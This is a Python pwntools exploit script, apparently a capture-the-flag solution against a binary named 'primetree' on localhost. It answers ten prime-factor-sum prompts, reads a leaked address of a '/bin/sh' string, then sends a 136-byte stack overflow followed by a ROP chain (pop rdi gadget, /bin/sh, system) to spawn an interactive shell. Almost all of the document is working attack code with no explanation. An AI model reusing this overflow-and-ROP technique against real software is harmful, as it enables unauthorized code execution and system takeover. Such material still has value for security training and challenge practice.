#!/usr/bin/python
from pwn import *
import re
import math

host = '127.0.0.1'
port = 1337

def prime_factorize (n):
	factors = []
	number = abs(n)
	factor = 2

	while number > 1:
		factor = get_next_prime_factor(number, factor)
		factors.append(factor)
		number /= factor

	if n < -1:
		factors[0] = -factors[0]

	return factors

def get_next_prime_factor(n, f):
	if n % 2 == 0:
		return 2

	for x in range(max(f, 3), int(math.sqrt(n) + 1), 2):
		if n % x == 0:
			return x

	return n

def exploit (r):
	name = '/bin/sh'
	#name = 'revixit'

	print (r.recvuntil ("?"))
	r.sendline (name)

	for x in range (10):
		number = r.recvuntil ("Sum: ")
		print number

		number = re.search (r'(?<=: )[0-9]+', number).group()
		number = int (number)

		r.sendline (str (sum (prime_factorize (number))))

	buffer = r.recvuntil ("? ")
	address = re.search (r'0x[a-f0-9]+', buffer).group ()
	address = int (address, 16)

	print buffer

	junk = 'A' * 136
	pop_rdi = p64 (0x0000000000400eb3) # got it from ROPgadget
	bin_sh = p64 (address) # the address given when we first reach the pwnme () function
	system = p64 (0x400be1) # since PIE is disabled, feel free to use this address obtained from disassembly

	print "Alamat gadget  : {0}".format(hex(u64(pop_rdi)))
	print "Alamat /bin/sh : {0}".format(hex(u64(bin_sh)))
	print "Alamat system  : {0}".format(hex(u64(system)))
	payload = junk + pop_rdi + bin_sh + system

	r.sendline (payload)

	r.interactive ()

	r.close ()

if __name__ == "__main__":
	e = ELF ('./primetree')

	if len (sys.argv) > 1:
		r = remote (host, port)
		exploit (r)
	else:
		r =  process ('./primetree')
		exploit (r)

